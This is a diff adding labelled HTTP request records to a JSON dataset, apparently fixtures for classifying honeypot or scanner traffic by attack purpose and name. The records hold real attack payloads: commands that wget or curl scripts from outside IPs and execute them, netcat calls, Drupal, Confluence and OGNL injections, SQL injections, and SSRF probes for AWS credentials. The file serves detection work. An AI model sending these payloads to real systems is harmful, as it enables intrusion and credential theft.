@@ -2778,5 +2778,365 @@
     "body": "id;uname -a;curl -ks http://212.83.160.70/t/cmd.txt > /tmp/a.out || wget http://212.83.160.70/t/cmd.txt -O /tmp/a.out || GET  http://212.83.160.70/t/cmd.txt > /tmp/a.out;php /tmp/a.out",
     "expected_purpose": "rce",
     "expected_name": null
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/recordings/misc/graph.php",
+    "ua": "python-requests/2.27.1",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "FreePBX Webshell"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/admin/?pal=cat+index.php&",
+    "ua": "Mozilla/5.0",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "FreePBX ARI Module Exploit"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/modules/faxnew/lang/sl.lang",
+    "ua": "Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Asterisk/FreePBX Surface Enumeration"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/?rest_route=/batch/v1",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
+    "body": "{\"requests\":[{\"method\":\"POST\",\"path\":\"///\"},{\"method\":\"POST\",\"path\":\"/wp/v2/posts\"},{\"method\":\"POST\",\"path\":\"/wp/v2/block-renderer/core/archives\"},{\"method\":\"POST\",\"path\":\"/batch/v1\",\"body\":{\"requests",
+    "expected_purpose": "credential_theft",
+    "expected_name": "WordPress REST Batch Endpoint Abuse"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Mozilla/5.0 (compatible; checker) wp2shell/CVE-2026-63030",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "wp2shell WordPress Exploitation Tool"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/wp-content/plugins/hellopress/wp_filemanager.php",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "WordPress hellopress Backdoor"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/template/aui/text-inline.vm",
+    "ua": "Mozilla/5.0",
+    "body": "label=aaa\\u0027%%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%%2b\\u0027&x=%40org.apache.commons.io.IOUtils%40toString%28%40java.l",
+    "expected_purpose": "rce",
+    "expected_name": "Atlassian Confluence Template Injection RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/cacti/remote_agent.php",
+    "ua": "Mozilla/5.0",
+    "body": "action=polldata&local_data_ids[0]=1&host_id=1&poller_id=;echo+CACTI_ab757a6619",
+    "expected_purpose": "rce",
+    "expected_name": "Cacti Remote Agent RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
+    "ua": "Mozilla/5.0",
+    "body": "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=echo DRUPAL7600_81fb06c2b8",
+    "expected_purpose": "rce",
+    "expected_name": "Drupalgeddon2"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/$%7B@java.lang.Runtime@getRuntime%28%29.exec%28%22nslookup%20da4ghb4upag7j4i9qnqgiuthuggyqaqcy.oast.me%22%29%7D/",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "OGNL Expression Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/ztp/cgi-bin/handler",
+    "ua": "Mozilla/5.0",
+    "body": "{\"command\":\"setWanPortSt\",\"data\":\"hi\",\"mtu\":\"1500\",\"port\":\"4\",\"proto\":\"dhcp\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\"}",
+    "expected_purpose": "rce",
+    "expected_name": "Zyxel ZTP Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/index.html/6469778abcdefgh.srv",
+    "ua": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36",
+    "body": "action=dbus&args=--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;nc${IFS}2.59.133.15",
+    "expected_purpose": "rce",
+    "expected_name": "AXIS Camera D-Bus Access"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/cgi-bin/setNoticeCfg",
+    "ua": "Mozilla/5.0",
+    "body": "NoticeUrl=%3Bcd+%2Ftmp+%3B+cd+%2Fvar%2Frun+%3B+cd+%2Fmnt+%3B+cd+%2Froot+%3B+cd+%2F+%3B+wget+http%3A%2F%2F46.151.182.200%2Frunme.sh+%3B+chmod+777+runme.sh+%3B+sh+runme.sh+totolink+%3B+rm+-f+runme.sh+sc",
+    "expected_purpose": "rce",
+    "expected_name": "IP Camera Config Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/ucp.php??act=cmd",
+    "ua": "Mozilla/5.0",
+    "body": "169266622905SKhPnhhPffXlZKt8ZbaAbjA0QzwwDA==ecbe8a154138",
+    "expected_purpose": "rce",
+    "expected_name": "phpBB UCP Backdoor Command"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/index.php?action=acymailing_frontrouter&columns=id%2Cname&ctrl=frontentityselect&entity=list&join=none&join_table=9753197531+AS+nx_gate&noheader=1&offset=0&page=acymailing_front&perCalls=1&task=loadEntityFront",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "AcyMailing SQL Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/nagiosql/admin/helpedit.php",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+    "body": "selInfoKey1=1'UNION SELECT MD5(31337) -- &hidKey1=common&selInfoKey2=&hidKey2=free_variables_name&selInfoVersion=&hidVersion=&taContent=&modus=0",
+    "expected_purpose": "credential_theft",
+    "expected_name": "NagiosQL SQL Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/.aws/metadata/iam/security-credentials/",
+    "ua": "Mozilla/5.0 (compatible; Amazonbot/0.1; +https://developer.amazon.com/support/amazonbot)",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "AWS Instance Metadata Path Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/proxy",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.2298.50 Safari/537.36; compatible; meta-externalagent/1.1; +https://developers.facebook.com/docs/sharing/webmasters/crawler",
+    "body": "{\"url\":\"file:///root/.aws/credentials\"}",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": "JSON Proxy SSRF Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/RPC2_Login",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+    "body": "{\"method\": \"global.login\", \"params\": {\"userName\": \"\", \"password\": \"\", \"clientType\": \"Web3.0\"}, \"id\": 0}",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Dahua/XMEye RPC Login Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/dvr/cmd",
+    "ua": "Abcd",
+    "body": "<cryptic binary>",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Embedded DVR Command Endpoint Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/level/15/exec/-",
+    "ua": "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Cisco IOS Privileged Exec Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/phpmyadmin4.8.5/index.php",
+    "ua": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36",
+    "body": "",
+    "expected_purpose": "app_discovery",
+    "expected_name": "phpMyAdmin Path Enumeration"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/",
+    "ua": "HelloScan/1.0",
+    "body": "{\"jsonrpc\":\"2.0\",\"method\":\"eth_chainId\",\"params\":[],\"id\":1}",
+    "expected_purpose": "api_probe",
+    "expected_name": "Blockchain JSON-RPC Node Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/socket.io/?EIO=4&transport=websocket",
+    "ua": "rawgrab",
+    "body": "",
+    "expected_purpose": "api_probe",
+    "expected_name": "Socket.IO Endpoint Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/rails/active_storage/direct_uploads",
+    "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    "body": "{}",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Rails Active Storage Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/",
+    "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "body": "XDEBUG_SESSION_START=1",
+    "expected_purpose": "app_discovery",
+    "expected_name": "Debug Mode Toggle Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "HelloScan/1.0",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "HelloScan"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "rawgrab",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "rawgrab Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "<cryptic binary>",
+    "ua": "r00ts3c-owned-you",
+    "body": "",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "r00ts3c Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/",
+    "ua": "Software Security Research/1.0 (+https://reverse-proxies-measurements.softsec.ruhr-uni-bochum.de)",
+    "body": "",
+    "expected_purpose": "research_scanner",
+    "expected_name": "Software Security Research Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/index.php",
+    "ua": "Mozilla/5.0",
+    "body": "s=index/\\think\\app/invokefunction&function=call_user_func_array",
+    "expected_purpose": "rce",
+    "expected_name": "ThinkPHP RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/",
+    "ua": "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36",
+    "body": "XDEBUG_SESSION_START=1",
+    "expected_purpose": "mass_scanner",
+    "expected_name": "Mozlila Source Map Scanner"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/api/v1/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F",
+    "ua": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; ChatGPT-User/1.0; +https://openai.com/bot)",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "AWS IMDS SSRF Fetch"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
+    "ua": "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot",
+    "body": "",
+    "expected_purpose": "proxy_abuse",
+    "expected_name": "JSON Proxy SSRF Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/level/15/exec/-/sh/run/CR",
+    "ua": "",
+    "body": "",
+    "expected_purpose": "device_infiltration",
+    "expected_name": "Cisco IOS Privileged Exec Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/api/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
+    "ua": "Mozilla/5.0 (compatible; Amzn-SearchBot/1.0; +https://developer.amazon.com/support/amazonbot)",
+    "body": "",
+    "expected_purpose": "credential_theft",
+    "expected_name": "API Discovery"
   }
 ]
